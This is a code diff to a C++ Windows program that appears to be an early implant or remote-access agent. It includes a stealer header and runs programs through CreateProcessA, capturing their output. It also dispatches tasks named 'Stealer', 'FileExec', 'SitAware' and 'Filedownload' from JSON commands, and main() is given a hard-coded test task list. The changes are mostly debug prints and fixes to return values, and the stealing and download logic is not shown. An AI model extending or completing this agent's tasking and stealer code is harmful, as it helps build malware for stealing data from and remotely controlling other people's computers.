@@ -3,6 +3,8 @@
 #include <minwinbase.h>
 #include "..\nlohmann\json.hpp"
 #include "..\Stealer\stealer.h"
+#include <iostream>
+//#include "..\HTTPstuff.h"
 
 using json = nlohmann::json;
 #define BUF_SIZE 4096
@@ -14,7 +16,7 @@ std::string exec(char* program, char* args){
     if (parsedCmds == NULL)
     {
         printf("Error allocating memory");
-        return 0;
+        return std::string("");
     }
 
     // Used these docs to understand sprintf https://learn.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2013/ybk95axf(v=vs.120)
@@ -56,13 +58,13 @@ std::string exec(char* program, char* args){
     {
         printf("CreatePipe Failed");
         printf("%d", GetLastError());
-        return NULL;
+        return std::string("");
     }
 
     if (!SetHandleInformation(hStdOutRead, 0x00000001, 0))
     {
         printf("Failed to set handle information for hStdOutRead");
-        return NULL;
+        return std::string("");
     }
     // TODO: Set
     // set startupinfo handles
@@ -87,7 +89,7 @@ std::string exec(char* program, char* args){
     {
         printf("Failed CreateProcessA\n");
         printf("%d", GetLastError());
-        return NULL;
+        return std::string("");
     }
 
     char *buffer = (char *)malloc(BUF_SIZE);
@@ -142,13 +144,19 @@ int parseArgs(json response){
     
     for (int i =0; i < numTasks; i++){
         std::string command = response.at(0).at("command");
+        std::cout << command;
         std::string args = response.at(0).at("args");
+        std::cout << args;
         if (command.compare("Stealer") == 0){
-            json res = driver();
+            printf("in stealer \n");
+            //json res = driver();
             //perform error checking then post
 
 
+
         } else if (command.compare("FileExec") == 0){
+            //std::string res = exec(args);
+            printf("in fileexec\n");
 
         } else if (command.compare("SitAware") == 0) {
 
@@ -160,15 +168,20 @@ int parseArgs(json response){
 
         } else if (command.compare("Filedownload") == 0){
             
+            
         } else {
             printf("NOOOOOOOOO none of the above\n");
         }
 
     }
+    return 0;
     
 }
 
 int main(int argc, char* argv[]){
+
+    json test = json("[{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ]");
+    parseArgs(test);
 
 
 }
